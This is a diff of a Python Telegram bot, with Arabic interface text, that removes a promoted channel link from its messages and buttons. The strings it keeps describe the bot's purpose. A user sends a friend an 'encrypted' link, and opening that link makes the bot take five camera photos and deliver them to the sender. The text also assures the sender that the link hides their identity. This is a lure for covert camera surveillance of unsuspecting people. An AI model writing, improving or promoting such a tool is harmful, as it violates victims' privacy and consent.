@@ -32,9 +32,6 @@ last_profile_update = {'last_update': 0}
 # تخزين أوامر المستخدمين للحد من السرعة
 user_commands = defaultdict(list)
 
-CHANNEL_NAME = "عالم البرمجيات | Software World"
-CHANNEL_URL = "https://t.me/KhaldounSoft"
-
 def parse_date(date_value):
     """تحويل التاريخ من نص إلى كائن datetime"""
     if isinstance(date_value, str):
@@ -124,16 +121,13 @@ def update_bot_profile(force=False):
         bot.set_my_description(
             f"📸 بوت الكاميرا الذكية\n"
             f"👥 عدد المستخدمين: {total_users}\n"
-            f"🖼️ إجمالي الصور: {total_photos_received}\n\n"
-            f"✨ بوت متخصص بالتقاط 5 صور من الكاميرا وإرسالها إليك\n\n"
-            f"📢 انضم إلى القناة لمتابعة كل جديد:\n"
-            f"👉 {CHANNEL_NAME}\n"
-            f"{CHANNEL_URL}"
+            f"🖼️ اجمالي الصور: {total_photos_received}\n\n"
+            f"✨ بوت متخصص بالتقاط 5 صور من الكاميرا وإرسالها إليك"
         )
         
         # تحديث النص القصير (about)
         bot.set_my_short_description(
-            f"📸 بوت الكاميرا الذكية | {total_users} مستخدم | 📢 {CHANNEL_URL}"
+            f"📸 بوت الكاميرا الذكية | {total_users} مستخدم"
         )
         
         last_profile_update['last_update'] = current_time
@@ -208,16 +202,14 @@ def send_welcome(message):
     # إنشاء أزرار
     markup = InlineKeyboardMarkup(row_width=2)
     
-    # زر نسخ الرابط وزر القناة
+    # زر نسخ الرابط
     copy_button = InlineKeyboardButton(text="📋 انسخ الرابط", callback_data=f"copy_{encrypted}")
-    channel_button = InlineKeyboardButton(text="📢 انضم للقناة", url=CHANNEL_URL)
     
     # أزرار المساعدة والإحصائيات
     help_button = InlineKeyboardButton(text="❓ التعليمات", callback_data="help")
     stats_button = InlineKeyboardButton(text="📊 إحصائياتي", callback_data="stats")
     
     markup.add(copy_button)
-    markup.add(channel_button)
     markup.add(help_button, stats_button)
 
     # عرض عدد المستخدمين الحالي
@@ -234,9 +226,7 @@ def send_welcome(message):
        f"1️⃣ قم بنسخ الرابط أعلاه.\n"
        f"2️⃣ أرسله لصديقك في رسالة (أو جربه بنفسك).\n"
        f"3️⃣ سيبدأ البوت فوراً بإرسال الصور إليك.\n\n"
-       f"🔒 *ملاحظة:* الرابط مشفر بالكامل، لا يمكن لأحد معرفة الرقم الأصلي.\n\n"
-       f"📢 *انضم إلى القناة لمتابعة كل جديد:*\n"
-       f"[{CHANNEL_NAME}]({CHANNEL_URL})"
+       f"🔒 *ملاحظة:* الرابط مشفر بالكامل، لا يمكن لأحد معرفة الرقم الأصلي."
     )
     bot.send_message(user_id, response, parse_mode="Markdown", reply_markup=markup)
     logger.info(f"User started: {user_name} (ID: {user_id}) - New: {is_new_user}")
@@ -482,8 +472,6 @@ def send_help(message):
         f"• البوت يأخذ 5 صور فقط ثم يتوقف\n"
         f"• يمكن إعادة فتح الرابط لالتقاط المزيد\n"
         f"• الصور تصل فقط لصاحب الرابط\n\n"
-        f"📢 *انضم إلى القناة لمتابعة كل جديد:*\n"
-        f"[{CHANNEL_NAME}]({CHANNEL_URL})\n\n"
         f"🛠️ للمساعدة التقنية: @khaled_developer"
     )
     
